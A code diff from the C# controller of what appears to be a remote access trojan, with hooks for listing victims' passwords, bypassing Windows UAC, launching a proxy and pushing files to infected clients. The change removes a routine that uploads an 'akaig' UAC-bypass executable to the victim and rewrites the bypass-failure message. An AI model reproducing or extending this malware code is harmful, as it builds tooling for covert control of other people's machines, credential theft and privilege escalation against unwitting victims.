@@ -25,7 +25,6 @@ namespace TutServer
         private const int _PORT = 100; //port number
         private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
         private int[] controlClients = { 0 };
-        private string akaigVersion = "";
         private static bool _isCmdStarted = false;
         public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.IsCmdOnline = value; } }
         private string _currentPath = "drive";
@@ -359,7 +358,6 @@ namespace TutServer
                 BridgeFunctions.ListPassword = new VoidDelegate(ctx.XListPassword);
                 BridgeFunctions.ClearList = new VoidDelegate(ctx.XClearList);
                 BridgeFunctions.BypassUAC = new VoidDelegate(ctx.XBypassUAC);
-                BridgeFunctions.UploadAkaig = new VoidDelegate(ctx.XUploadAkaig);
                 BridgeFunctions.StartProxy = new VoidDelegate(ctx.XLaunchProxy);
                 BridgeFunctions.SaveFile = new StringDelegate(ctx.XSaveEditorFile);
                 BridgeFunctions.ShowInputBox = new InputDelegate(ctx.XInputBox);
@@ -404,17 +402,6 @@ namespace TutServer
             }
 
             button34_Click(null, null);
-        }
-
-        public void XUploadAkaig()
-        {
-            if (InvokeRequired)
-            {
-                Invoke(BridgeFunctions.UploadAkaig);
-                return;
-            }
-
-            button20_Click(null, null);
         }
 
         public void XBypassUAC()
@@ -962,7 +949,6 @@ namespace TutServer
             update.Tick += new EventHandler(updateValues);
             update.Start();
 
-            button20.Enabled = false;
             Class1.test = "not test";
             sh = new ScriptHost("scripts", this);
             sh.LoadDllFiles();
@@ -1787,10 +1773,7 @@ namespace TutServer
                     t.Start();
                     if (title == "UAC Bypass")
                     {
-                        if (message.Contains("akaig32")) akaigVersion = "32";
-                        else if (message.Contains("akaig64")) akaigVersion = "64";
-                        msgbox("Error! Code: " + code, title + "\n" + message, MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                        EnableButton(button20, true);
+                        msgbox("UAC Bypass Failed", "Please upload the core files to the directory the client is located in\r\n(" + remStart + ")", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     }
 
                     Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title);
@@ -2317,7 +2300,6 @@ namespace TutServer
 
                 controlClients = clients.ToArray();
                 sCore.RAT.ServerSettings.currentClient = controlClients[0];
-                akaigVersion = "";
                 sendCommand("getstart", clients[0]);
             }
         }
@@ -3531,22 +3513,6 @@ namespace TutServer
         private void button33_Click(object sender, EventArgs e)
         {
             loopSend("uacbypass");
-        }
-
-        private void button20_Click(object sender, EventArgs e)
-        {
-            if (akaigVersion == "")
-            {
-                MessageBox.Show(this, "Unable to upload akaig", "No akaig version specified", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                return;
-            }
-            if (!File.Exists(Application.StartupPath + "\\external\\akaig" + akaigVersion + ".exe")) return;
-
-            fup_local_path = "external\\akaig" + akaigVersion + ".exe";
-            long akaigSize = new FileInfo(fup_local_path).Length;
-            uploadFinished = false;
-            string cmd = "fup§" + remStart + "\\akaig" + akaigVersion + ".exe§" + akaigSize;
-            loopSend(cmd);
         }
 
         private void button34_Click(object sender, EventArgs e)
